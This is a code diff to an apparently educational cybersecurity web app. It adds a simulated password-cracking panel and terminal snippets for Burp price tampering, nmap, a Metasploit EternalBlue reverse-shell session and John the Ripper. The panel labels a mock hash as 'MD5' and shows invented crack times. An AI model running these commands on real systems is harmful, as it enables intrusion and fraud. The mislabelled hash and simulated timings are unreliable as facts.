@@ -17,6 +17,183 @@ const cheatSheetData = [
   { tool: 'Netcat', command: 'nc -zv <target> 80-443', language: '{Bash}', description: 'Scan open HTTP/HTTPS ports silently', use: 'Uses Netcat as a simple port scanner to check if ports in the range 80 to 443 are open on the target, without sending any data. Useful for quick port verification.' }
 ];
 
+const HashCrackerSection = () => {
+  const [password, setPassword] = useState('');
+  const [hashes, setHashes] = useState({ md5: '', sha256: '' });
+  const [strength, setStrength] = useState({ score: 0, label: 'Very Weak', color: 'danger' });
+  const [isCracking, setIsCracking] = useState(false);
+  const [crackAttempts, setCrackAttempts] = useState(0);
+  const [crackTime, setCrackTime] = useState<string | null>(null);
+
+  // Simple mock MD5 for demonstration
+  const getMockMD5 = (str: string) => {
+    let hash = 0;
+    for (let i = 0; i < str.length; i++) hash = Math.imul(31, hash) + str.charCodeAt(i) | 0;
+    const hex = Math.abs(hash).toString(16);
+    return hex.padStart(32, hex).substring(0, 32);
+  };
+
+  const getSHA256 = async (str: string) => {
+    try {
+      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+      return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
+    } catch {
+      return 'Error generating hash';
+    }
+  };
+
+  useEffect(() => {
+    if (!password) {
+      setHashes({ md5: '', sha256: '' });
+      setStrength({ score: 0, label: 'None', color: 'secondary' });
+      return;
+    }
+
+    // Hash generation
+    getSHA256(password).then(sha => {
+      setHashes({ md5: getMockMD5(password), sha256: sha });
+    });
+
+    // Simple strength calculation
+    let score = 0;
+    if (password.length > 7) score++;
+    if (/[A-Z]/.test(password)) score++;
+    if (/[0-9]/.test(password)) score++;
+    if (/[^A-Za-z0-9]/.test(password)) score++;
+
+    if (password.length < 5) score = 0;
+
+    const labels = ['Very Weak', 'Weak', 'Fair', 'Strong', 'Very Strong'];
+    const colors = ['danger', 'danger', 'warning', 'info', 'success'];
+
+    setStrength({ score, label: labels[score], color: colors[score] });
+    setCrackTime(null);
+    setCrackAttempts(0);
+  }, [password]);
+
+  const runBruteForce = () => {
+    if (!password) return;
+    setIsCracking(true);
+    setCrackAttempts(0);
+    setCrackTime(null);
+
+    const dictionary = ['123456', 'password', '12345678', 'qwerty', '12345', '123456789', 'football', 'admin', 'welcome'];
+    const isCommon = dictionary.includes(password.toLowerCase());
+    
+    let attempts = 0;
+    const maxAttempts = isCommon ? dictionary.indexOf(password.toLowerCase()) + 1 : 150000;
+    const interval = setInterval(() => {
+      attempts += isCommon ? 1 : Math.floor(Math.random() * 5000) + 1000;
+      setCrackAttempts(attempts);
+
+      if (isCommon && attempts >= maxAttempts) {
+        clearInterval(interval);
+        setIsCracking(false);
+        setCrackTime('0.02 seconds (Found in common dictionary)');
+      } else if (!isCommon && attempts >= maxAttempts) {
+        clearInterval(interval);
+        setIsCracking(false);
+        const timeToCrack = strength.score > 3 ? 'Years/Centuries' : strength.score > 2 ? 'Hours/Days' : 'Minutes';
+        setCrackTime(timeToCrack + ` (Simulated ${attempts.toLocaleString()} attempts)`);
+      }
+    }, 50);
+  };
+
+  return (
+    <section id="hashCracker" className="min-vh-100 pt-5 mt-5">
+      <div className="container">
+        <h2 className="section-title text-center"><i className="fa-solid fa-unlock-keyhole me-2"></i>Hash Cracker & Password Strength</h2>
+        
+        <div className="row justify-content-center g-4">
+          <div className="col-lg-8">
+            <div className="cyber-card p-4 mb-4">
+              <h4 className="mb-4 text-info"><i className="fa-solid fa-key me-2"></i>Password Analyzer</h4>
+              
+              <div className="mb-4">
+                <label className="form-label text-secondary">Test Password</label>
+                <input 
+                  type="text" 
+                  className="form-control form-control-lg" 
+                  placeholder="Type a password to analyze..." 
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  style={{ fontFamily: 'monospace' }}
+                />
+              </div>
+
+              {password && (
+                <div className="mb-4">
+                  <div className="d-flex justify-content-between mb-1">
+                    <span className="text-secondary">Strength Score</span>
+                    <span className={`text-${strength.color} fw-bold`}>{strength.label}</span>
+                  </div>
+                  <div className="progress" style={{ height: '10px', backgroundColor: '#111' }}>
+                    <div 
+                      className={`progress-bar bg-${strength.color}`} 
+                      role="progressbar" 
+                      style={{ width: `${Math.max(10, strength.score * 25)}%`, transition: 'width 0.3s ease, background-color 0.3s ease' }}
+                    ></div>
+                  </div>
+                </div>
+              )}
+
+              {password && (
+                <div className="terminal-box mb-4">
+                  <div className="mb-2">
+                    <span className="text-secondary">MD5 Hash:</span>
+                    <div className="text-warning text-break" style={{ fontFamily: 'monospace' }}>{hashes.md5}</div>
+                  </div>
+                  <div>
+                    <span className="text-secondary">SHA-256 Hash:</span>
+                    <div className="text-info text-break" style={{ fontFamily: 'monospace' }}>{hashes.sha256}</div>
+                  </div>
+                </div>
+              )}
+
+              <button 
+                className="btn btn-cyber w-100" 
+                onClick={runBruteForce}
+                disabled={!password || isCracking}
+              >
+                <i className={`fa-solid ${isCracking ? 'fa-spinner fa-spin' : 'fa-hammer'} me-2`}></i>
+                {isCracking ? 'Simulating Brute-Force...' : 'Run Brute-Force Simulation'}
+              </button>
+
+              {(isCracking || crackTime) && (
+                <div className="mt-4 p-3 border border-secondary rounded bg-dark">
+                  <div className="d-flex justify-content-between align-items-center mb-2">
+                    <span className="text-secondary"><i className="fa-solid fa-terminal me-2"></i>Cracking Status:</span>
+                    <span className={isCracking ? 'text-warning' : 'text-danger fw-bold'}>
+                      {isCracking ? 'IN PROGRESS' : 'CRACKED / STOPPED'}
+                    </span>
+                  </div>
+                  <div className="mb-1">
+                    <span className="text-secondary">Attempts: </span>
+                    <span className="text-white" style={{ fontFamily: 'monospace' }}>{crackAttempts.toLocaleString()}</span>
+                  </div>
+                  {crackTime && (
+                    <div>
+                      <span className="text-secondary">Estimated Time to Crack: </span>
+                      <span className="text-danger fw-bold">{crackTime}</span>
+                    </div>
+                  )}
+                </div>
+              )}
+            </div>
+            
+            <div className="cyber-card p-4 border-info" style={{borderWidth: '2px'}}>
+               <h5 className="text-info mb-3"><i className="fa-solid fa-circle-info me-2"></i>How Passwords are Cracked</h5>
+               <p className="text-secondary mb-2"><strong className="text-white">Dictionary Attack:</strong> Hackers use massive lists of common passwords (like "123456", "password123") and simply try all of them. If your password is in the list, it's cracked instantly.</p>
+               <p className="text-secondary mb-2"><strong className="text-white">Brute-Force Attack:</strong> Trying every possible combination of characters (a, b, c... aa, ab...). This takes much longer but is inevitable for short passwords.</p>
+               <p className="text-secondary mb-0"><strong className="text-white">Hashing:</strong> Websites shouldn't store your actual password. They store a "Hash" (like the SHA-256 above). When hackers steal the database, they use powerful GPUs to generate hashes for billions of guesses per second until they find a hash that matches yours.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  );
+};
+
 export default function App() {
   const [targetIP, setTargetIP] = useState('');
   const [isScanning, setIsScanning] = useState(false);
@@ -25,7 +202,7 @@ export default function App() {
   const [showLocation, setShowLocation] = useState(false);
   const [recentScans, setRecentScans] = useState<string[]>([]);
   const [selectedCheat, setSelectedCheat] = useState<{ tool: string; command: string; description: string; use: string; language?: string } | null>(null);
-  const [currentView, setCurrentView] = useState<'home' | 'scanner' | 'labs' | 'cheatsheet' | 'signin' | 'languages' | 'awareness' | 'ethicalHacking' | 'linuxSecurity' | 'networkDefense'>('home');
+  const [currentView, setCurrentView] = useState<'home' | 'scanner' | 'labs' | 'cheatsheet' | 'signin' | 'languages' | 'ethicalHacking' | 'linuxSecurity' | 'networkDefense' | 'hashCracker'>('home');
   const [isLightMode, setIsLightMode] = useState(false);
   const [copiedText, setCopiedText] = useState<string | null>(null);
   const [loggedInUser, setLoggedInUser] = useState<string | null>(null);
@@ -156,7 +333,7 @@ export default function App() {
               <li className="nav-item"><a className={`nav-link ${currentView === 'labs' ? 'active' : ''}`} href="#labs" onClick={(e) => { e.preventDefault(); setCurrentView('labs'); window.scrollTo(0,0); }}>Cyber Labs</a></li>
               <li className="nav-item"><a className={`nav-link ${currentView === 'cheatsheet' ? 'active' : ''}`} href="#cheatsheet" onClick={(e) => { e.preventDefault(); setCurrentView('cheatsheet'); window.scrollTo(0,0); }}>Cheat-Sheet</a></li>
               <li className="nav-item"><a className={`nav-link ${currentView === 'languages' ? 'active' : ''}`} href="#languages" onClick={(e) => { e.preventDefault(); setCurrentView('languages'); window.scrollTo(0,0); }}>Cheat by Languages</a></li>
-              <li className="nav-item"><a className={`nav-link ${currentView === 'awareness' ? 'active' : ''}`} href="#awareness" onClick={(e) => { e.preventDefault(); setCurrentView('awareness'); window.scrollTo(0,0); }}>Cyber Awareness</a></li>
+              <li className="nav-item"><a className={`nav-link ${currentView === 'hashCracker' ? 'active' : ''}`} href="#hashCracker" onClick={(e) => { e.preventDefault(); setCurrentView('hashCracker'); window.scrollTo(0,0); }}>Hash Cracker</a></li>
               <li className="nav-item d-flex align-items-center ms-lg-3 me-2">
                 <div className="form-check form-switch mb-0" style={{ cursor: 'pointer' }}>
                   <input className="form-check-input" type="checkbox" id="themeSwitch" checked={isLightMode} onChange={() => setIsLightMode(!isLightMode)} style={{ cursor: 'pointer', backgroundColor: isLightMode ? 'var(--cyber-green)' : 'transparent', borderColor: 'var(--cyber-green)' }} />
@@ -509,43 +686,7 @@ export default function App() {
         </section>
       )}
 
-      {currentView === 'awareness' && (
-        <section id="awareness" className="min-vh-100 pt-5 mt-5">
-          <div className="container">
-            <h2 className="section-title text-center"><i className="fa-solid fa-shield-cat me-2"></i>Cyber Awareness & Fraud Prevention</h2>
-            <div className="row g-4">
-              <div className="col-md-6">
-                <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
-                  <h4 className="text-danger"><i className="fa-solid fa-envelope-open-text me-2"></i>Phishing & Smishing</h4>
-                  <p className="text-secondary"><strong className="text-danger">How they trap you:</strong> Hackers send fake emails or SMS pretending to be your bank, delivery service, or a trusted company. They create a sense of urgency (e.g., "Your account will be blocked") with a malicious link.</p>
-                  <p className="text-secondary"><strong className="text-danger">How they steal:</strong> When you click the link, it opens a fake login page. If you enter your credentials or OTP, they capture it instantly and access your real account.</p>
-                </div>
-              </div>
-              <div className="col-md-6">
-                <div className="cyber-card p-4 h-100 border-warning" style={{borderWidth: '2px'}}>
-                  <h4 className="text-warning"><i className="fa-solid fa-gift me-2"></i>Fake Lottery & Job Scams</h4>
-                  <p className="text-secondary"><strong className="text-warning">How they trap you:</strong> You receive a message that you've won a huge lottery or got a high-paying part-time job (like liking YouTube videos). They build trust by paying you a small amount initially.</p>
-                  <p className="text-secondary"><strong className="text-warning">How they steal:</strong> They ask for a "processing fee" or "investment" to release your big reward or higher-tier tasks. Once you pay the large amount, they disappear with your money.</p>
-                </div>
-              </div>
-              <div className="col-md-6">
-                <div className="cyber-card p-4 h-100 border-info" style={{borderWidth: '2px'}}>
-                  <h4 className="text-info"><i className="fa-solid fa-wifi me-2"></i>Evil Twin Wi-Fi (Public Wi-Fi)</h4>
-                  <p className="text-secondary"><strong className="text-info">How they trap you:</strong> Hackers set up a free public Wi-Fi hotspot with a name similar to a popular cafe or airport network. You connect to it because it's free and lacks a password.</p>
-                  <p className="text-secondary"><strong className="text-info">How they steal:</strong> All your traffic routes through the hacker's device. They use Man-in-the-Middle (MitM) attacks to capture your unencrypted passwords, session cookies, and banking details.</p>
-                </div>
-              </div>
-              <div className="col-md-6">
-                <div className="cyber-card p-4 h-100 border-primary" style={{borderWidth: '2px'}}>
-                  <h4 className="text-primary"><i className="fa-solid fa-mobile-screen-button me-2"></i>AnyDesk / Screen Share Scams</h4>
-                  <p className="text-secondary"><strong className="text-primary">How they trap you:</strong> Scammers call you posing as customer support (e.g., for KYC update, refund, or fixing an issue) and convince you to download a remote desktop app like AnyDesk or TeamViewer.</p>
-                  <p className="text-secondary"><strong className="text-primary">How they steal:</strong> Once you give them the code, they can see your screen. They ask you to login to your bank or tell you an OTP has arrived, secretly transferring funds while you watch helplessly.</p>
-                </div>
-              </div>
-            </div>
-          </div>
-        </section>
-      )}
+      {currentView === 'hashCracker' && <HashCrackerSection />}
 
       {currentView === 'networkDefense' && (
         <section id="networkDefense" className="min-vh-100 pt-5 mt-5">
@@ -765,28 +906,95 @@ export default function App() {
                 <div className="cyber-card p-4 h-100">
                   <h4 className="text-info"><i className="fa-solid fa-spider me-2"></i>Burp Suite</h4>
                   <p className="text-secondary"><strong className="text-info">What it is:</strong> A web vulnerability scanner and proxy tool.</p>
-                  <p className="text-secondary"><strong className="text-info">How Hackers Use It:</strong> Intercepts and modifies web traffic before it reaches the server.<br/><br/><strong className="text-info">Example:</strong> Intercepting a checkout request and changing a laptop's price from $1000 to $1 before forwarding it to the server.</p>
+                  <p className="text-secondary mb-3"><strong className="text-info">How Hackers Use It:</strong> Intercepts and modifies web traffic before it reaches the server.<br/><br/><strong className="text-info">Example:</strong> Intercepting a checkout request and changing a laptop's price from $1000 to $1 before forwarding it to the server.</p>
+                  <div className="mt-auto p-3 bg-dark rounded border border-info border-opacity-25">
+                    <div className="mb-2 border-bottom border-secondary pb-1 d-flex justify-content-between align-items-center">
+                      <strong className="text-info small">Intercepted HTTP Request (Modified)</strong>
+                      <CopyButton text={"POST /api/checkout HTTP/1.1\nHost: target-shop.local\nContent-Type: application/json\n\n{\n  \"item\": \"laptop\",\n  \"price\": 1.00\n}"} copiedText={copiedText} onCopy={handleCopy} />
+                    </div>
+                    <pre className="mb-0 text-light small" style={{ fontFamily: 'monospace', overflowX: 'auto' }}>
+                      <span className="text-danger fw-bold">POST</span> /api/checkout HTTP/1.1<br/>
+                      Host: target-shop.local<br/>
+                      Content-Type: application/json<br/>
+                      <br/>
+                      <span className="text-secondary">{"{"}</span><br/>
+                      &nbsp;&nbsp;"item": "laptop",<br/>
+                      &nbsp;&nbsp;"price": <span className="text-danger fw-bold text-decoration-line-through">1000.00</span> <span className="text-success fw-bold">1.00</span><br/>
+                      <span className="text-secondary">{"}"}</span>
+                    </pre>
+                  </div>
                 </div>
               </div>
               <div className="col-md-6">
-                <div className="cyber-card p-4 h-100">
+                <div className="cyber-card p-4 h-100 d-flex flex-column">
                   <h4 className="text-warning"><i className="fa-solid fa-network-wired me-2"></i>Nmap (Network Mapper)</h4>
                   <p className="text-secondary"><strong className="text-warning">What it is:</strong> A free and open-source utility for network discovery and security auditing.</p>
-                  <p className="text-secondary"><strong className="text-warning">How Hackers Use It:</strong> Scans networks to find open ports, running services, and OS details.<br/><br/><strong className="text-warning">Example:</strong> Scanning an IP and finding Port 21 (FTP) open with an outdated, vulnerable version of FileZilla running.</p>
+                  <p className="text-secondary mb-3"><strong className="text-warning">How Hackers Use It:</strong> Scans networks to find open ports, running services, and OS details.<br/><br/><strong className="text-warning">Example:</strong> Scanning an IP and finding Port 21 (FTP) open with an outdated, vulnerable version of FileZilla running.</p>
+                  <div className="mt-auto p-3 bg-dark rounded border border-warning border-opacity-25">
+                    <div className="mb-2 border-bottom border-secondary pb-1 d-flex justify-content-between align-items-center">
+                      <strong className="text-warning small">Bash Terminal</strong>
+                      <CopyButton text={"nmap -sV -sC -p 21,80 192.168.1.105"} copiedText={copiedText} onCopy={handleCopy} />
+                    </div>
+                    <pre className="mb-0 text-light small" style={{ fontFamily: 'monospace', overflowX: 'auto' }}>
+                      <span className="text-warning fw-bold">root@kali:~#</span> nmap -sV -sC -p 21,80 192.168.1.105<br/>
+                      <br/>
+                      <span className="text-secondary">Starting Nmap 7.93...</span><br/>
+                      PORT   STATE SERVICE VERSION<br/>
+                      21/tcp open  ftp     <span className="text-danger fw-bold">vsftpd 2.3.4</span><br/>
+                      80/tcp open  http    Apache httpd 2.4.41<br/>
+                      <br/>
+                      <span className="text-success">Nmap done: 1 IP address (1 host up) scanned</span>
+                    </pre>
+                  </div>
                 </div>
               </div>
               <div className="col-md-6">
-                <div className="cyber-card p-4 h-100">
+                <div className="cyber-card p-4 h-100 d-flex flex-column">
                   <h4 className="text-danger"><i className="fa-brands fa-metapush me-2"></i>Metasploit Framework</h4>
                   <p className="text-secondary"><strong className="text-danger">What it is:</strong> A penetration testing framework that makes hacking simple.</p>
-                  <p className="text-secondary"><strong className="text-danger">How Hackers Use It:</strong> Uses pre-written exploit code to attack known software vulnerabilities.<br/><br/><strong className="text-danger">Example:</strong> Selecting the 'EternalBlue' exploit to target an unpatched Windows machine, granting remote command line access.</p>
+                  <p className="text-secondary mb-3"><strong className="text-danger">How Hackers Use It:</strong> Uses pre-written exploit code to attack known software vulnerabilities.<br/><br/><strong className="text-danger">Example:</strong> Selecting the 'EternalBlue' exploit to target an unpatched Windows machine, granting remote command line access.</p>
+                  <div className="mt-auto p-3 bg-dark rounded border border-danger border-opacity-25">
+                    <div className="mb-2 border-bottom border-secondary pb-1 d-flex justify-content-between align-items-center">
+                      <strong className="text-danger small">MSF Console</strong>
+                      <CopyButton text={"use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit"} copiedText={copiedText} onCopy={handleCopy} />
+                    </div>
+                    <pre className="mb-0 text-light small" style={{ fontFamily: 'monospace', overflowX: 'auto' }}>
+                      <span className="text-danger fw-bold">msf6 &gt;</span> use exploit/windows/smb/ms17_010_eternalblue<br/>
+                      <span className="text-danger fw-bold">msf6 exploit(...) &gt;</span> set RHOSTS 10.0.0.50<br/>
+                      <span className="text-danger fw-bold">msf6 exploit(...) &gt;</span> set PAYLOAD windows/x64/meterpreter/reverse_tcp<br/>
+                      <span className="text-danger fw-bold">msf6 exploit(...) &gt;</span> exploit<br/>
+                      <br/>
+                      <span className="text-info">[*]</span> Started reverse TCP handler on 10.0.0.5:4444<br/>
+                      <span className="text-success fw-bold">[+]</span> WIN - target successfully breached.<br/>
+                      <span className="text-danger fw-bold">meterpreter &gt;</span> getuid<br/>
+                      Server username: <span className="text-warning">NT AUTHORITY\SYSTEM</span>
+                    </pre>
+                  </div>
                 </div>
               </div>
               <div className="col-md-6">
-                <div className="cyber-card p-4 h-100">
+                <div className="cyber-card p-4 h-100 d-flex flex-column">
                   <h4 className="text-success"><i className="fa-solid fa-key me-2"></i>John the Ripper / Hashcat</h4>
                   <p className="text-secondary"><strong className="text-success">What it is:</strong> Advanced password cracking tools.</p>
-                  <p className="text-secondary"><strong className="text-success">How Hackers Use It:</strong> Rapidly guesses passwords to reverse encrypted (hashed) password files.<br/><br/><strong className="text-success">Example:</strong> Using a stolen database and the 'rockyou' dictionary list to crack a user's hashed password back to "password123".</p>
+                  <p className="text-secondary mb-3"><strong className="text-success">How Hackers Use It:</strong> Rapidly guesses passwords to reverse encrypted (hashed) password files.<br/><br/><strong className="text-success">Example:</strong> Using a stolen database and the 'rockyou' dictionary list to crack a user's hashed password back to "password123".</p>
+                  <div className="mt-auto p-3 bg-dark rounded border border-success border-opacity-25">
+                    <div className="mb-2 border-bottom border-secondary pb-1 d-flex justify-content-between align-items-center">
+                      <strong className="text-success small">Bash Terminal</strong>
+                      <CopyButton text={"john --wordlist=rockyou.txt hashes.txt"} copiedText={copiedText} onCopy={handleCopy} />
+                    </div>
+                    <pre className="mb-0 text-light small" style={{ fontFamily: 'monospace', overflowX: 'auto' }}>
+                      <span className="text-success fw-bold">root@kali:~#</span> john --wordlist=rockyou.txt hashes.txt<br/>
+                      <br/>
+                      <span className="text-secondary">Using default input encoding: UTF-8</span><br/>
+                      <span className="text-secondary">Loaded 1 password hash (bcrypt)</span><br/>
+                      <span className="text-secondary">Press 'q' or Ctrl-C to abort...</span><br/>
+                      <br/>
+                      <span className="text-warning fw-bold">password123</span>      <span className="text-secondary">(admin)</span><br/>
+                      <br/>
+                      <span className="text-success">1g 0:00:00:04 DONE 0.222g/s 345p/s</span><br/>
+                      <span className="text-secondary">Use "--show" to display cracked passwords</span>
+                    </pre>
+                  </div>
                 </div>
               </div>
             </div>
